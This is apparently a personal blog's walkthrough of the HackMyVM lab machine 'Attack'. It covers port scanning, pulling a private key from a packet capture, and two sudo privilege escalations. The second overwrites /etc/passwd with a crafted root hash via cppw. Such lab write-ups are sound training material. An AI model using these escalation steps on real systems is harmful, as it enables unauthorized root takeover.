---
layout: post
author: maxin
title:  "Attack"
date:   2022-01-01 09:54:07 PM -03
category: HackMyVM
tags: Writeup
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Attack)

# Enumeration

{% highlight text  %}
# Nmap 7.92 scan initiated Thu Dec 30 13:23:08 2021 as: nmap -sC -sV -v -oN nmap 192.168.0.53
Nmap scan report for 192.168.0.53
Host is up (0.018s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f4:8d:08:b4:99:d2:0c:5d:75:b8:22:83:7b:c2:88:15 (RSA)
|   256 e2:16:0a:e7:38:4a:ec:76:cf:d3:56:78:07:fd:2f:25 (ECDSA)
|_  256 0b:5a:9c:71:cc:3b:50:04:46:18:ad:67:8a:df:d0:d6 (ED25519)
80/tcp open  http    nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 13:23:21 2021 -- 1 IP address (1 host up) scanned in 12.96 seconds
{% endhighlight  %}

# Port 80

{% highlight text  %}
I did a capture with wireshark. 
The name of the file is "capture" but i dont remember the extension :(
{% endhighlight  %}

{% highlight bash  %}
wget $IP/capture.pcap
{% endhighlight  %}

# Wireshark

On TCP stream 2. We can see a `zip` file 

File > Export Objects > HTTP → Download the file

This zip has a image and it’s a QRCode, go to [https://zxing.org/w/decode.jspx](https://zxing.org/w/decode.jspx) and decode this image

{% highlight text  %}
http://localhost/jackobattack.txt -> Decoded message
{% endhighlight  %}

# User

{% highlight bash  %}
wget $IP/jackobattack.txt
{% endhighlight  %}

This file it’s the jackob private key 

# Root - Part 1

{% highlight bash  %}
sudo -l

User jackob may run the following commands on attack:
    (kratos) NOPASSWD: /home/jackob/attack.sh
{% endhighlight  %}

We can create a new attack.sh file and add `/bin/bash` inside this file

Changed the file of attack.sh to attack.bkp

Create a new file called attack.sh and add:

{% highlight bash  %}
#!/bin/bash

/bin/bash
{% endhighlight  %}

Now use sudo has kratos

{% highlight bash  %}
sudo -u kratos /home/jackob/attack.sh
{% endhighlight  %}

# Root - Part 2

{% highlight bash  %}
sudo -l

User kratos may run the following commands on attack:
    (root) NOPASSWD: /usr/sbin/cppw
{% endhighlight  %}

The cppw binary allows us to changed passwd or shadow file 

We can use `makepasswd` to create a new passwd and changed `/etc/passwd`  file

{% highlight bash  %}
echo -n "admin123" | makepasswd --crypt-md5 --clearfrom -
{% endhighlight  %}

Get the output password and create a file with it

{% highlight bash  %}
echo "root:\$1\$K8t2noVp\$wwpuT6JnNnPn91vkheLTT0:0:0:root:/root:/bin/bash" > passwdfile
Remember to escape the $
{% endhighlight  %}

{% highlight bash  %}
sudo /usr/sbin/cppw passwdfile
su root #Use the previous password
{% endhighlight  %}